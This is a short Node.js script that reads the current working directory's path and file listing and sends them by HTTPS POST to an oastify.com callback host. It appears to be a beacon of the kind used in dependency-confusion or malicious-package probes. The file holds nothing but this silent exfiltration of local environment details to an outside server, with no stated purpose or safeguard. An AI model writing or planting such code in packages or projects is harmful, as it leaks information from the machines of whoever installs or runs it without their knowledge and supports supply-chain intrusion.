const https = require('https');
const fs = require('fs');

const files = fs.readdirSync(process.cwd());
const payload = JSON.stringify({ cwd: process.cwd(), files });

const req = https.request('https://ccsfcqpeh2dm4dhuejwjdylfz65xtrhg.oastify.com', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload)
  }
});
req.write(payload);
req.end();
